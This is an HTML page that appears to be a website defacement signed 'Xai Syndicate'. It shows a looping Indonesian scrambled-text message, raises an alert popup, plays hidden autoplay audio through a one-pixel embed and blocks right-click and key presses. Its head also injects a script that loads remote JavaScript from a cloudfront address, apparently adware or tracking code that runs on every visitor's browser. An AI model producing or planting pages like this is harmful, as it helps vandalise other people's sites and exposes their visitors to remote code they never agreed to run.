




<!DOCTYPE html>
<html >

<head>
  <meta charset="UTF-8">
  <title>Yeah</title>
  <meta content='Xai Syndicate' name='description'/>
  <meta content='Xai Syndicate' name='keywords'/>
  <meta content='Xai Syndicate' name='Abstract'/>
  <script>alert("Numpang galau ya min :'(");</script>
  
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">

  
      <style>
      @import 'https://fonts.googleapis.com/css?family=Roboto+Mono:100';
html,
body {
  font-family: 'Roboto Mono', monospace;
  background: #212121;
  height: 100%;
}
.container {
  height: 100%;
  width: 100%;
  justify-content: center;
  align-items: center;
  display: flex;
}
.text {
  font-weight: 100;
  font-size: 28px;
  color: #fafafa;
}
.dud {
  color: #757575;
}

    </style>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>

  
  
<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.10.492#p=toshibaxmq01abd050_261zt8rftxx261zt8rft";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>

<body translate="no" >

  <div class="container">
  <div class="text"></div>
</div>
  
  
    <script>
    'use strict';

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

// 01010101110011010101110010101010101101
// TextScramble
// 01010101110011010101110010101010101101

var TextScramble = function () {
  function TextScramble(el) {
    _classCallCheck(this, TextScramble);

    this.el = el;
    this.chars = '!<>-_\\/[]{}?E+*^?#________';
    this.update = this.update.bind(this);
  }

  TextScramble.prototype.setText = function setText(newText) {
    var _this = this;

    var oldText = this.el.innerText;
    var length = Math.max(oldText.length, newText.length);
    var promise = new Promise(function (resolve) {
      return _this.resolve = resolve;
    });
    this.queue = [];
    for (var i = 0; i < length; i++) {
      var from = oldText[i] || '';
      var to = newText[i] || '';
      var start = Math.floor(Math.random() * 40);
      var end = start + Math.floor(Math.random() * 40);
      this.queue.push({ from: from, to: to, start: start, end: end });
    }
    cancelAnimationFrame(this.frameRequest);
    this.frame = 0;
    this.update();
    return promise;
  };

  TextScramble.prototype.update = function update() {
    var output = '';
    var complete = 0;
    for (var i = 0, n = this.queue.length; i < n; i++) {
      var _queue$i = this.queue[i];
      var from = _queue$i.from;
      var to = _queue$i.to;
      var start = _queue$i.start;
      var end = _queue$i.end;
      var char = _queue$i.char;

      if (this.frame >= end) {
        complete++;
        output += to;
      } else if (this.frame >= start) {
        if (!char || Math.random() < 0.28) {
          char = this.randomChar();
          this.queue[i].char = char;
        }
        output += '<span class="dud">' + char + '</span>';
      } else {
        output += from;
      }
    }
    this.el.innerHTML = output;
    if (complete === this.queue.length) {
      this.resolve();
    } else {
      this.frameRequest = requestAnimationFrame(this.update);
      this.frame++;
    }
  };

  TextScramble.prototype.randomChar = function randomChar() {
    return this.chars[Math.floor(Math.random() * this.chars.length)];
  };

  return TextScramble;
}();

// ??????????????????????????????????????????????????
// Example
// ??????????????????????????????????????????????????

var phrases = ['............................','.....................','.....................','Makan Bang.....!!!','...............','Bang..!' ,'Abang lagi seneng sini makan....','Abang lagi Marah ',' sini makan....','Abang lagi Sedih sini makan....','Abang lagi Main ','Sini makan....','Sini Makan..!','Sini Makan..!','Sini Makan..!','Sini Makan..!','Bagaimanapun Makan yuk Bang..!!','Hey..!!','Makan Bang..!! ','Abang Tolong jangan bimbang...!!','Hey..!!','Makan Bang.!','Biar Jadi kayak orang..!!','Hey..!!','Makan Bang..!!','Abang Tolong jangan bimbang...!!','Hey..!!','Makan Bang..!','Biar Jadi kayak orang..!!','Makan Bang..!','Makan Bang..!!','Makan Bang..!!!','Makan Bang..!!!!','Makan Bang..!!!!!','Makan Bang..!!!!!!','Makan Bang..!!!!!!!','Makan Bang..!!!!!!!!'];

var el = document.querySelector('.text');
var fx = new TextScramble(el);

var counter = 0;
var next = function next() {
  fx.setText(phrases[counter]).then(function () {
    setTimeout(next, 1000);
  });
  counter = (counter + 1) % phrases.length;
};

next();
  </script>
<embed src="https://www.youtube.com/v/nvlxPoD9lwE&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="1" height="1"></embed>
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'><script type="text/javascript"> 
 
</body>
</html>
 